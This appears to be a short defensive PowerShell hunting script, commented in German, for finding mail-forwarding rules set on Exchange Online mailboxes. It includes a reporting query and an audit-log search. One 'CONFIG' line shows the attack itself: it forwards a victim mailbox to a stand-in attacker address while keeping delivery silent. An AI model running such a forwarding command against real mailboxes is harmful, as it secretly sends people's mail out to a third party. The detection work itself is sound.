#SCRIPTNAME: Hunt Mailforwarding in MBX

#Target: setzen von mbx forward erkennen
#Cloud Service: Exchange Online
#Risiko: unbemerktes forwarden von mails
#Quelle: SANS DFIR SUMMIT 2022

#CONFIG: Forward einrichten
Set-Mailbox -identity Victim -ForwardingSmtpAddress Attacker@threatactor.dev
-DeliverToMailboxAndForward $true

#REPORT: Alle Mailboxen mit forwardings anzeigen
Get-Mailbox -ResultSize Unlimited | Where-Object {($Null -ne $_.ForwardingSmtpAddress)} | Select-Object Identity,Name,ForwardingSmtpAddress

#DETECT: Unified audit Logs
$logs = Search-UnifiedAuditLog -Operations set-mailbox -StartDate 2022-01-01 -EndDate 2022-06-30
ForEach ($record in $logs){
$AuditData = $record.AuditData | ConvertFrom-Json
if ( $AuditData.Parameters | Where-Object Name -eq 'forwardingsmtpaddress' )
{$record}}

#WE>>MER